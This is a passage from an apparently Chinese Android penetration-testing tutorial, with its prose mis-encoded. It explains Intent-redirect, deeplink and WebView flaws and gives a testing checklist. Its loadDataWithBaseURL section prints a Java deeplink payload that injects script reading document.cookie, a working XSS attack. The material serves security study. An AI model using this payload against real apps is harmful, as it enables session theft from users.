class="line"><span class="language-xml">   <span class="comment">&lt;!--ç‚¹å‡»æŒ‰é’®åˆ™è°ƒç”¨callAndroidå‡½æ•°--&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>CIntent Attack!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>ç„¶åå¯åŠ¨http_server</p><p><img src="/posts/f416437f.htm/905443_25GBQWTFBW4APF8.png" alt="image-20220729172309137"></p><p>æ­¤æ—¶æˆ‘ä»¬å¯åŠ¨æ”»å‡»æ ·æœ¬ï¼Œå¹¶ç‚¹å‡»æŒ‰é’®ï¼Œå°±èƒ½åŠ è½½æˆ‘ä»¬çš„æ¶æ„htmlï¼Œè¿›è€Œè·å¾—æ•æ„Ÿä¿¡æ¯</p><h5 id="Intenté‡å®šå‘å¯¼è‡´launchAnyWhereæ¼æ´"><strong>Intenté‡å®šå‘å¯¼è‡´launchAnyWhereæ¼æ´</strong></h5><p><strong>æ¼æ´åŸç†</strong></p><p>å¯¼å‡ºç»„ä»¶å¾€å¾€å­˜åœ¨ä¸€å®šçš„å®‰å…¨é—®é¢˜</p><p>å¯¼å‡ºç»„ä»¶ä¸€èˆ¬æœ‰ä¸‹é¢ä¸‰ç§å½¢å¼ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>åœ¨AndroidManifest.xmlä¸­çš„ç»„ä»¶å¦‚æœæ˜¾å¼è®¾ç½®äº†ç»„ä»¶å±æ€§android:exportedå€¼ä¸º<span class="keyword">true</span>;</span><br><span class="line"><span class="number">2.</span>å¦‚æœç»„ä»¶æ²¡æœ‰æ˜¾å¼è®¾ç½®android:exportedä¸º<span class="keyword">false</span>ï¼Œä½†æ˜¯å…¶intent-<span class="keyword">filter</span>ä»¥åŠactionå­˜åœ¨ï¼Œåˆ™ä¹Ÿä¸ºå¯¼å‡ºç»„ä»¶</span><br><span class="line"><span class="number">3.</span>API <span class="keyword">Level</span>åœ¨<span class="number">17</span>ä»¥ä¸‹çš„æ‰€æœ‰Appçš„providerç»„ä»¶çš„android:exportedå±æ€§é»˜è®¤å€¼ä¸º<span class="keyword">true</span>ï¼Œ<span class="number">17</span>åŠä»¥ä¸Šé»˜è®¤å€¼ä¸º<span class="keyword">false</span>ã€‚</span><br></pre></td></tr></table></figure><p>æœªå¯¼å‡ºç»„ä»¶</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç»„ä»¶æ˜¾å¼è®¾ç½®android:exported=<span class="string">&quot;false&quot;</span></span><br><span class="line">ç»„ä»¶æ²¡æœ‰intent-<span class="built_in">filter</span>, ä¸”æ²¡æœ‰æ˜¾å¼è®¾ç½®android:exportedçš„å±æ€§å€¼ï¼Œé»˜è®¤ä¸ºéå¯¼å‡ºçš„;</span><br><span class="line">ç»„ä»¶è™½ç„¶é…ç½®äº†intent-<span class="built_in">filter</span>,ï¼Œä½†æ˜¯æ˜¾å¼è®¾ç½®android:exported=<span class="string">&quot;false&quot;</span></span><br></pre></td></tr></table></figure><p>è€Œé€šè¿‡ä¸€äº›æ–¹æ³•å¯ä»¥è®¿é—®æœªå¯¼å‡ºçš„ç»„ä»¶ï¼Œè¿™ç§æ¼æ´æˆä¸ºlaunchAnyWhereæ¼æ´</p><p>Intentå¯ä»¥é€šè¿‡é‡å®šå‘çš„åŸç†ï¼Œé€šè¿‡æºå¸¦æ•°æ®ä¿¡æ¯ï¼Œè®¿é—®ä¸€ä¸ªå¯å¯¼å‡ºçš„ç»„ä»¶ï¼Œç„¶åå†è¿›è¡Œæ•°æ®ä¼ é€’å»è§¦å‘ä¸å¯å¯¼å‡ºçš„ç»„ä»¶ï¼Œæœ€åå®ç°è®¿é—®ç§æœ‰ç»„ä»¶çš„ç›®çš„ï¼Œå¼•èµ·<code>launchAnyWhere</code>æ¼æ´</p><p><strong>æ¼æ´å¤ç°</strong></p><p>é¦–å…ˆæ˜¯ä¸å¯å¯¼å‡ºç»„ä»¶PrivateActivity:</p><p><img src="/posts/f416437f.htm/905443_DFCPGD63DGYF3HU.png" alt="image-20220730124850689"></p><p>ç„¶åå¯å¯¼å‡ºçš„ç»„ä»¶ï¼šWebView2Activity</p><p>ä»£ç å±‚çš„æ ¡éªŒä»£ç ï¼š</p><p>WebView2Activity</p><p><img src="/posts/f416437f.htm/905443_UTXVH9Q5AYRTWVH-17277663837329.png" alt="image-20220730125041041"></p><p>PrivateActivity</p><p><img src="/posts/f416437f.htm/905443_MMQXRU274JXCJRT-172776639201112.png" alt="image-20220730125108657"></p><p>æ”»å‡»ä»£ç ï¼š</p><p><img src="/posts/f416437f.htm/905443_W4Q2EBR4BJMXG2R-172776641592615.png" alt="image-20220730125254413"></p><p>å¯ä»¥çœ‹å‡ºæˆ‘ä»¬é€šè¿‡WebView+Intenté‡å®šå‘å°±å¯ä»¥è®¿é—®ç§æœ‰ç»„ä»¶ï¼Œä»è€Œå®ç°launchAnyWhereæ¼æ´</p><h4 id="Deeplink-WebViewæ¼æ´">Deeplink + WebViewæ¼æ´</h4><h5 id="ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´"><strong>ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</strong></h5><p><strong>æ¼æ´åŸç†</strong></p><p>æ ·æœ¬ä»£ç å±‚é€šè¿‡åå°„è°ƒç”¨æŸä¸ªæ‰‹æœºä¸Šå·²ç»å®‰è£…çš„åº”ç”¨ï¼Œç„¶åè°ƒç”¨è¿™ä¸ªåº”ç”¨çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ç›¸åŒçš„åŒ…åï¼Œç„¶åå°†æ”»å‡»æ ·æœ¬å®‰è£…åˆ°æ‰‹æœºä¸Šå»ï¼Œä½¿å¾—åº”ç”¨è§¦å‘ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</p><p>æ ·æœ¬ä»£ç </p><p><img src="/posts/f416437f.htm/905443_ZTVPKHEC4XQMYCD.png" alt="image-20220730125800892"></p><p>è°ƒç”¨com.insecureshopapp.Maininterfaceä¸‹çš„getinstanceæ–¹æ³•</p><p>æ„é€ æ”»å‡»æ ·æœ¬</p><p><img src="/posts/f416437f.htm/905443_J9EY8R3E44SH4U5.png" alt="image-20220730125820419"></p><p>æ³¨æ„è¿™é‡Œæˆ‘ä»¬è¦ä¿è¯æ„é€ çš„æ”»å‡»åº”ç”¨çš„åŒ…åå’Œä»£ç ä¸­æ ¡éªŒçš„ä¸€è‡´æ‰èƒ½è§¦å‘ï¼Œç„¶åæˆ‘ä»¬å¯åŠ¨ï¼Œå¯ä»¥å‘ç°æˆåŠŸçš„è§¦å‘äº†</p><h5 id="xssæ³¨å…¥æ¼æ´"><strong>xssæ³¨å…¥æ¼æ´</strong></h5><p><strong>æ¼æ´åŸç†</strong></p><p>ç»“åˆDeeplink+WebViewå¯¼è‡´çš„ä¸€ä¸ªæ¼æ´é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å«æ·±åº¦è°ƒç”¨é“¾çš„jsï¼Œç„¶åé€šè¿‡åŠ è½½å»å®ç°xssæ³¨å…¥</p><p><strong>æ¼æ´å¤ç°</strong></p><p>é¦–å…ˆæˆ‘ä»¬æŸ¥çœ‹æ ·æœ¬çš„DeepLinks</p><p><img src="/posts/f416437f.htm/905443_NAWTWSGDKWK8C82.png" alt="image-20220730130234190"></p><p>ç„¶åæˆ‘ä»¬å¯ä»¥å‘ç°æ ·æœ¬çš„ä»£ç ï¼š</p><p><img src="/posts/f416437f.htm/905443_8KJCX2AWWZRCTQQ.png" alt="image-20220730130256549"></p><p>æˆ‘ä»¬æ„é€ æ”»å‡»è„šæœ¬ï¼š</p><p><img src="/posts/f416437f.htm/905443_QA4SKBFC23HK4T8.png" alt="image-20220730130336427"></p><p>ç„¶åæˆ‘ä»¬é€šè¿‡å»è®¿é—®è¯¥html:</p><p><img src="/posts/f416437f.htm/905443_7XWKDCAB62358C7.png" alt="image-20220730130416578"></p><p>æ¥ç€æˆ‘ä»¬ä½¿ç”¨ç›®æ ‡æ ·æœ¬æ‰“å¼€ï¼š</p><p><img src="/posts/f416437f.htm/905443_WZVGRQ9J7AZPFDA.png" alt="image-20220730130442740"></p><p>å³å¯ä»¥æˆåŠŸçš„è¿›è¡ŒXSSæ³¨å…¥</p><p><img src="/posts/f416437f.htm/905443_ARQAAUCNDV3N5BR.png" alt="image-20220730130506890"></p><h5 id="DeepLinksåœ¨WebViewä¸Šçš„ç»„åˆæ¼æ´">DeepLinksåœ¨WebViewä¸Šçš„ç»„åˆæ¼æ´</h5><p>æˆ‘ä»¬å‰é¢åˆ†æäº†å¾ˆå¤šDeepLinksåœ¨WebViewä¸Šçš„æ¼æ´ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°†è¿™äº›æ¼æ´ç»„åˆä½¿ç”¨ï¼Œæˆ‘åœ¨æµ‹è¯•ä¸€æ¬¾é“¶è¡Œçš„æ ·æœ¬ä¸­å‘ç°ç»„åˆæ¼æ´ï¼š</p><p><img src="/posts/f416437f.htm/905443_V55CMQ4ACJKK8WX.png" alt="image-20220730130714437"></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="http://blog.nsfocus.net/app-vulnerability-exploitation-combination-boxing/">APPæ¼æ´åˆ©ç”¨ç»„åˆæ‹³â€”â€”åº”ç”¨å…‹éš†æ¡ˆä¾‹åˆ†æ</a></p><h5 id="loadDataWithBaseURLæ¼æ´">loadDataWithBaseURLæ¼æ´</h5><p><a href="https://mp.weixin.qq.com/s/81Lq-JwASnkSS2wg62HSvA?">Androidä¸­çš„ç‰¹æ®Šæ”»å‡»é¢ï¼ˆäºŒï¼‰â€”â€”å±é™©çš„deeplink</a></p><p>å½“<code>loadDataWithBaseURL</code>çš„åŸŸåå’Œå†…å®¹åŒæ—¶å¯æ§æ—¶ï¼Œå¯ä»¥æ„é€ ä»»æ„åŸŸä¸‹çš„XSS</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">void</span> loadDataWithBaseURL</span><br><span class="line">(<span class="built_in">String</span> baseUrl,</span><br><span class="line"><span class="built_in">String</span> <span class="built_in">data</span>,</span><br><span class="line"><span class="built_in">String</span> mimeType,</span><br><span class="line"><span class="built_in">String</span> encoding,</span><br><span class="line"><span class="built_in">String</span> historyUrl)</span><br></pre></td></tr></table></figure><p>é™¤äº†æ˜æ˜¾çš„æƒ…å†µå¤–ï¼Œæ”»å‡»è€…æ§åˆ¶è°ƒç”¨ä¸­çš„<code>baseUri</code>å’Œå‚æ•°<code>data</code></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webView.loadDataWithBaseURL<span class="punctuation">(</span><span class="string">&quot;https://google.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="string">&quot;&lt;script&gt;document.write(document.domain)&lt;/script&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="literal">null</span><span class="punctuation">,</span> <span class="literal">null</span><span class="punctuation">,</span> <span class="literal">null</span><span class="punctuation">)</span><span class="punctuation">;</span></span><br></pre></td></tr></table></figure><p><strong>æ¼æ´åŸç†</strong></p><p>deeplinkåŠ è½½ä»»æ„fragmentï¼Œè½¬åŒ–ä¸ºWebView loadDataWithBaseURLæ¼æ´</p><p><strong>æ¼æ´å¤ç°</strong></p><p>å®ç°æ­¥éª¤ï¼š</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)victim-app://c/contact/<span class="number">2</span>?fragmen_class=<span class="variable">&lt;fragment&gt;</span>å¯å¯åŠ¨ä»»æ„<span class="keyword">fragment</span>ï¼Œå¹¶å¯ é€šè¿‡Intent Extraä¼ å‚</span><br><span class="line">(<span class="number">2</span>)å¯»æ‰¾åˆ°â¼€ä¸ªå¸¦WebViewçš„Fragmentï¼šGoogleMapWebViewFragment</span><br><span class="line">(<span class="number">3</span>)å¯æ±¡æŸ“<span class="built_in">load</span>DataWithBaseURLçš„å‰ä¸¤ä¸ªå‚æ•°ï¼Œæ„é€ victim.comåŸŸä¸‹çš„XSS</span><br><span class="line">webview.<span class="built_in">load</span>DataWithBaseURL(<span class="string">&quot;victim.com&quot;</span>,<span class="string">&quot;google-map.html&quot;</span>,    <span class="string">&quot;text/html&quot;</span>,    ...);</span><br></pre></td></tr></table></figure><p>æ”»å‡»ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(Intent.ACTION_VIEW);</span><br><span class="line">payload.setData(Uri.parse(<span class="string">&quot;victim-app://c/contact/2?fragmen_class=com.victim.app.GoogleWebViewMapFragment&quot;</span>));</span><br><span class="line"><span class="type">Bundle</span> <span class="variable">extra</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line">extra.putString(<span class="string">&quot;map_url&quot;</span>, <span class="string">&quot;\&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;script&gt;&quot;</span>);</span><br><span class="line">extra.putString(<span class="string">&quot;map_file_name&quot;</span>, <span class="string">&quot;google_map.html&quot;</span>);</span><br><span class="line">extra.putString(<span class="string">&quot;map_domain&quot;</span>, <span class="string">&quot;https://www.victim-app.com&quot;</span>);</span><br><span class="line">payload.putExtra(<span class="string">&quot;bundle&quot;</span>, extra);</span><br><span class="line">startActivity(payload);</span><br></pre></td></tr></table></figure><h1>å®‰å…¨åˆ†æå·¥å…·å®‰å…¨</h1><h2 id="drozer">drozer</h2><p>å‚è€ƒbç«™æ•™ç¨‹</p><h2 id="MobSF">MobSF</h2><p>dockerå®‰è£…æŠ¥é”™ï¼Œå‚è€ƒhttps://kresna.dev/solving-podman-error-short-name-did-not-resolve-to-an-alias-and-no-unqualified-search-registries/</p><p>githubä¸­ä¸‹è½½é¡¹ç›®ï¼Œç„¶ååœ¨ç›¸åº”æ–‡ä»¶å¤¹ä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./setup.<span class="keyword">sh</span></span><br><span class="line">./<span class="keyword">run</span>.<span class="keyword">sh</span></span><br><span class="line">ç„¶åæµè§ˆå™¨ä¸­ http:<span class="comment">//localhost:8000</span></span><br></pre></td></tr></table></figure><h1>APPæ¸—é€æµ‹è¯•è¦ç‚¹</h1><p>æµ‹è¯•ç‚¹å¦‚ä¸‹å›¾<img src="/posts/f416437f.htm/image-20241005195332293.png" alt="image-20241005195332293"></p><h2 id="å®¢æˆ·ç«¯ç¨‹åºå®‰å…¨">å®¢æˆ·ç«¯ç¨‹åºå®‰å…¨</h2><h3 id="å®‰è£…åŒ…ç­¾å">å®‰è£…åŒ…ç­¾å</h3><p>å¦‚ä¸‹å‘½ä»¤æ£€æŸ¥apkç­¾å</p><p><strong>jarsigner.exe -verify APK æ–‡ä»¶è·¯å¾„ -verbose -certs</strong>     å¦‚æœCN=t001såˆ™å®‰å…¨</p><p>åªæœ‰åœ¨ä½¿ç”¨ç›´æ¥å®¢æˆ·çš„è¯ä¹¦ç­¾åæ—¶ï¼Œæ‰è®¤ä¸ºå®‰å…¨ã€‚Debug è¯ä¹¦ã€ç¬¬ä¸‰æ–¹ï¼ˆå¦‚</p><p>å¼€å‘æ–¹ï¼‰è¯ä¹¦ç­‰ç­‰å‡è®¤ä¸ºé£é™©ã€‚</p><p><strong>å®‰å…¨å»ºè®®</strong></p><p>å°†å®‰è£…åŒ…è¿›è¡Œç­¾åå¹¶æ£€æµ‹å®‰è£…åŒ…ç­¾åçš„å¼‚å¸¸</p><h3 id="åç¼–è¯‘ä¿æŠ¤">åç¼–è¯‘ä¿æŠ¤</h3><p>â€‹        æµ‹è¯•å®¢æˆ·ç«¯å®‰è£…ç¨‹åºï¼Œåˆ¤æ–­æ˜¯å¦èƒ½åç¼–è¯‘ä¸ºæºä»£ç ï¼Œjava ä»£ç å’Œ so æ–‡ä»¶æ˜¯å¦å­˜åœ¨ä»£ç æ··æ·†ç­‰ä¿æŠ¤æªæ–½ã€‚æœªä½œä¿æŠ¤çš„ java ä»£ç ï¼Œå¯ä»¥è½»æ˜“åˆ†æå…¶è¿è¡Œé€»è¾‘ï¼Œå¹¶é’ˆå¯¹ä»£ç ä¸­çš„ç¼ºé™·å¯¹å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨ç«¯è¿›è¡Œæ”»å‡»ã€‚æˆåŠŸçš„åç¼–è¯‘å°†ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿå®Œæ•´åœ°åˆ†æ APP çš„è¿è¡Œé€»è¾‘ï¼Œå°¤å…¶æ˜¯ç›¸å…³ä¸šåŠ¡æ¥å£åè®®ã€å’Œé€šä¿¡åŠ å¯†çš„å®ç°</p><p>å¦‚æœapkæœ‰èŠ±æŒ‡ä»¤ï¼Œapktoolä¼šå‡ºç°è§£åŒ…å¤±è´¥</p><h3 id="åº”ç”¨å®Œæ•´æ€§æ ¡éªŒ">åº”ç”¨å®Œæ•´æ€§æ ¡éªŒ</h3><p>â€‹        æµ‹è¯•å®¢æˆ·ç«¯ç¨‹åºæ˜¯å¦å¯¹è‡ªèº«å®Œæ•´æ€§è¿›è¡Œæ ¡éªŒã€‚æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡åç¼–è¯‘çš„æ–¹æ³•åœ¨å®¢æˆ·ç«¯ç¨‹åºä¸­æ¤å…¥è‡ªå·±çš„æœ¨é©¬ï¼Œå®¢æˆ·ç«¯ç¨‹åºå¦‚æœæ²¡æœ‰è‡ªæ ¡éªŒæœºåˆ¶çš„è¯ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ç¯¡æ”¹å®¢æˆ·ç«¯ç¨‹åºçªƒå–æ‰‹æœºç”¨æˆ·çš„éšç§ä¿¡æ¯ã€‚</p><p><strong>å¦‚æœæ²¡æœ‰è¿›è¡Œæ ¡éªŒ</strong></p><p>å¯¹äºä¿®æ”¹åçš„apkè¿›è¡Œé‡æ–°æ‰“åŒ…ç­¾åå®‰è£…ï¼Œä»ç„¶ä¼šæ­£å¸¸è¿è¡Œï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä¹‹å‰å®‰è£…çš„ APK å’Œä¿®æ”¹åçš„ APK ç­¾åä¸åŒï¼Œå°±ä¸èƒ½ç›´æ¥è¦†ç›–å®‰è£…ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œå…ˆå¸è½½ä¹‹å‰å®‰è£…çš„ APP å³å¯ï¼‰ã€æ³¨ï¼šAPK å¿…é¡»è¿›è¡Œç­¾ååï¼Œæ–¹å¯å®‰è£…å’Œè¿è¡Œã€‚å¦‚æœå¼€å¯äº†â€œå…è®¸æœªçŸ¥æ¥æºçš„åº”ç”¨â€ï¼Œé‚£ä¹ˆ Debug è¯ä¹¦ã€è‡ªç­¾åè¯ä¹¦ã€è¿‡æœŸè¯ä¹¦çš„ç­¾åéƒ½æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯ä¸å¯ä»¥ä¸ç­¾åã€‚ã€‘</p><p><strong>å¦‚æœæœ‰è¿›è¡Œæ ¡éªŒ</strong></p><p>å®‰è£…çš„apkä¼šæ— æ³•æ­£å¸¸è¿è¡Œ</p><p><strong>å¨èƒç­‰çº§</strong></p><p>â€‹        è‹¥åº”ç”¨å®Œæ•´æ€§æ ¡éªŒä¸ä½¿ç”¨ MANIFEST.MF ä¸­çš„æ•°æ®ï¼Œä¸”æ ¸å¿ƒä»£ç é€šè¿‡ JNI æŠ€æœ¯å†™å…¥.soåº“ï¼ŒåŒæ—¶äºæœåŠ¡ç«¯è¿›è¡Œç›¸å…³æ ¡éªŒï¼Œæ­¤æ—¶æ— é£é™©ã€‚</p><p>â€‹       è‹¥åº”ç”¨å®Œæ•´æ€§äºæœ¬åœ°è¿›è¡ŒéªŒè¯è€Œä¸å­˜åœ¨å…¶ä»–é—®é¢˜æˆ–ä½¿ç”¨ MANIFEST.MF ä¸­çš„æ•°æ®ä½œä¸ºéªŒè¯å‡­è¯ï¼ˆæœ‰æ–°æ–‡ä»¶æ—¶æç¤ºåº”ç”¨å®Œæ•´æ€§éªŒè¯å¤±è´¥ï¼‰ï¼Œæ­¤æ—¶ä½é£é™©ï¼›</p><p>â€‹       è‹¥åœ¨æœ¬åœ°è¿›è¡ŒéªŒè¯çš„åŸºç¡€ä¸Šåªé€šè¿‡ MANIFEST.MF å¯¹å®¢æˆ·ç«¯åŸæœ‰æ–‡ä»¶è¿›è¡Œæ ¡éªŒè€Œå¿½ç•¥æ–°å¢æ–‡ä»¶çš„æ£€éªŒï¼Œæ­¤æ—¶ä¸­é£é™©ï¼›</p><p>â€‹       è‹¥æœªè¿›è¡Œåº”ç”¨å®Œæ•´æ€§æ ¡éªŒæ­¤æ—¶é«˜é£é™©</p><h3 id="ç»„ä»¶å®‰å…¨">ç»„ä»¶å®‰å…¨</h3><p>æŸ¥çœ‹æ˜¯å¦æ˜¯å¯å¯¼å‡ºçš„</p><h2 id="æ•æ„Ÿä¿¡æ¯å®‰å…¨">æ•æ„Ÿä¿¡æ¯å®‰å…¨</h2><h3 id="æ•°æ®æ–‡ä»¶">æ•°æ®æ–‡ä»¶</h3><p>æ£€æµ‹å®¢æˆ·ç«¯æ˜¯å¦ä¿å­˜æ˜æ–‡æ•æ„Ÿä¿¡æ¯ï¼Œèƒ½å¦é˜²æ­¢ç”¨æˆ·æ•æ„Ÿä¿¡æ¯çš„éæˆæƒè®¿é—®ã€‚</p><p>æ–‡ä»¶æ•æ„Ÿä¿¡æ¯æ³„éœ²ä»¥æ˜æ–‡å­˜å‚¨â€œè®°ä½å¯†ç â€å±…å¤šã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå…ˆå°†å®‰å“è®¾å¤‡ä¸­çš„æ–‡ä»¶å¤åˆ¶åˆ°æœ‰é¼ æ ‡çš„ä¸»æœºä¸Šï¼Œæ–¹ä¾¿æŸ¥çœ‹ã€‚</p><p><strong>æµ‹è¯•æ­¥éª¤</strong></p><p>é¦–å…ˆæŸ¥çœ‹ç›¸å…³æ–‡ä»¶çš„æƒé™é…ç½®ã€‚</p><p>æ­£å¸¸çš„æ–‡ä»¶æƒé™æœ€åä¸‰ä½åº”ä¸ºç©ºï¼ˆç±»ä¼¼â€œrw-rw----â€ï¼‰ï¼Œå³é™¤åº”ç”¨è‡ªå·±ä»¥å¤–ä»»ä½•äººæ— æ³•è¯»å†™ï¼›ç›®å½•åˆ™å…è®¸å¤šä¸€ä¸ªæ‰§è¡Œä½ï¼ˆç±»ä¼¼â€œrwxrwxâ€”xâ€ï¼‰ã€‚</p><p>å½“å®¢æˆ·ç«¯ä½¿ç”¨ MODE_WORLD_READABLE æˆ– MODE_WORLD_WRITEABLE æ¨¡å¼åˆ›å»ºæ–‡ä»¶æ—¶ï¼Œshared_prefs ç›®å½•ä¸‹æ–‡ä»¶çš„æƒé™ä¹Ÿä¼šå¤šå‡ºä¸€äº›ï¼Œè¿™ä¸ä¸€å®šæ˜¯å®‰å…¨é—®é¢˜</p><p>æƒé™æ£€æµ‹å®Œæ•´åï¼Œå†æ£€æŸ¥å®¢æˆ·ç«¯ç¨‹åºå­˜å‚¨åœ¨æ‰‹æœºä¸­çš„ SharedPreferences é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸æ˜¯å¯¹æœ¬ç›®å½•ä¸‹çš„æ–‡ä»¶å†…å®¹ï¼ˆä¸€èˆ¬æ˜¯ xmlï¼‰è¿›è¡Œæ£€æŸ¥ï¼Œçœ‹æ˜¯å¦åŒ…å«æ•æ„Ÿä¿¡æ¯ã€‚</p><p>æœ€ååœ¨æ£€æµ‹ SQLite æ•°æ®åº“æ–‡ä»¶ï¼Œåœ¨ç§æœ‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æŸ¥æ‰¾ä»¥.db ç»“å°¾çš„æ•°æ®åº“æ–‡ä»¶ã€‚å¯¹äºä½¿ç”¨äº† webView ç¼“å­˜çš„åº”ç”¨ï¼Œä¼šåœ¨ databases å­ç›®å½•ä¸­ä¿å­˜ webview.db å’ŒwebviewCache.dbï¼Œå¦‚å›¾æ‰€ç¤ºã€‚å…¶ä¸­æœ‰å¯èƒ½ä¼šè®°å½• cookies å’Œæäº¤è¡¨å•ç­‰ä¿¡æ¯ã€‚</p><p>è¿˜æœ‰äº›æ—¶å€™ï¼Œå®¢æˆ·ç«¯ç¨‹åº apk åŒ…ä¸­ä¹Ÿæ˜¯æ˜¯ä¿å­˜æœ‰æ•æ„Ÿä¿¡æ¯çš„ï¼Œæ¯”å¦‚æ£€æŸ¥ apk åŒ…ä¸­å„ç±»æ–‡ä»¶æ˜¯å¦åŒ…å«ç¡¬ç¼–ç çš„çš„æ•æ„Ÿä¿¡æ¯ç­‰ã€‚</p><h3 id="Logcatæ—¥å¿—">Logcatæ—¥å¿—</h3><p>æœ¬é¡¹ä¸»è¦æ˜¯æ£€æŸ¥å®¢æˆ·ç«¯ç¨‹åºå­˜å‚¨åœ¨æ‰‹æœºä¸­çš„æ—¥å¿—æ˜¯å¦å«æœ‰æ•æ„Ÿä¿¡æ¯ã€‚</p><p><strong>logcat -d</strong>    <strong>//ä¸€æ¬¡æ€§è¾“å‡ºæ—¥å¿—ç¼“å­˜ï¼Œä¸ä¼šé˜»å¡</strong></p><p><strong>å®‰å…¨å»ºè®®</strong></p><p>æ•°æ®ä¼ è¾“åº”åšåˆ°åŠ å¯†å¤„ç†ï¼Œæ•æ„Ÿä¿¡æ¯ä¸è¦è¾“å‡ºåœ¨ logcat æ—¥å¿—ä¸­</p><h2 id="å¯†ç å®‰å…¨"><strong>å¯†ç å®‰å…¨</strong></h2><h3 id="é”®ç›˜åŠ«æŒ">é”®ç›˜åŠ«æŒ</h3><p>æµ‹è¯•å®¢æˆ·ç«¯ç¨‹åºåœ¨å¯†ç ç­‰è¾“å…¥æ¡†æ˜¯å¦ä½¿ç”¨è‡ªå®šä¹‰è½¯é”®ç›˜ã€‚å®‰å“åº”ç”¨ä¸­çš„è¾“å…¥æ¡†é»˜è®¤ä½¿ç”¨ç³»ç»Ÿè½¯é”®ç›˜ï¼Œæ‰‹æœºå®‰è£…æœ¨é©¬åï¼Œæœ¨é©¬å¯ä»¥é€šè¿‡æ›¿æ¢ç³»ç»Ÿè½¯é”®ç›˜ï¼Œè®°å½•æ‰‹æœºé”®ç›˜è¾“è¿‡çš„å¯†ç </p><h3 id="éšæœºå¸ƒå±€è½¯é”®ç›˜">éšæœºå¸ƒå±€è½¯é”®ç›˜</h3><p>æµ‹è¯•å®¢æˆ·ç«¯å®ç°çš„è½¯é”®ç›˜ï¼Œæ˜¯å¦æ»¡è¶³é”®ä½éšæœºå¸ƒæ”¾è¦æ±‚ã€‚</p><h3 id="å±å¹•å½•åƒ">å±å¹•å½•åƒ</h3><p>å®¢æˆ·ç«¯ä½¿ç”¨çš„éšæœºå¸ƒå±€è½¯é”®ç›˜æ˜¯å¦ä¼šå¯¹ç”¨æˆ·ç‚¹å‡»äº§ç”Ÿè§†è§‰å“åº”ã€‚å½“éšæœºå¸ƒå±€è½¯é”®ç›˜å¯¹ç”¨æˆ·ç‚¹å‡»äº§ç”Ÿè§†è§‰å“åº”æ—¶ï¼Œå®‰å“æœ¨é©¬å¯ä»¥é€šè¿‡è¿ç»­æˆªå±çš„æ–¹å¼ï¼Œå¯¹ç”¨æˆ·å‡»é”®è¿›è¡Œè®°å½•ï¼Œä»è€Œè·å¾—ç”¨æˆ·è¾“å…¥</p><p><strong>æµ‹è¯•æ­¥éª¤</strong></p><p>adb shell /system/bin/screencap -p è¾“å‡º png è·¯å¾„ï¼ˆå®‰å“è®¾å¤‡ä¸­ï¼‰</p><p>åœ¨/mnt/sdcard/è·¯å¾„ä¸‹ï¼Œå¯ä»¥çœ‹åˆ° 1a.pngï¼š</p><p>è¿˜æœ‰ä¸€ç§éªŒè¯æ–¹å¼æ˜¯ä»ä»£ç æ–¹é¢è¿›è¡ŒéªŒè¯ï¼š</p><p>é¦–å…ˆæ£€æµ‹éœ€è¾ƒé«˜å®‰å…¨æ€§çš„çª—å£ï¼ˆå¦‚å¯†ç è¾“å…¥æ¡†ï¼‰ï¼Œçœ‹ä»£ç 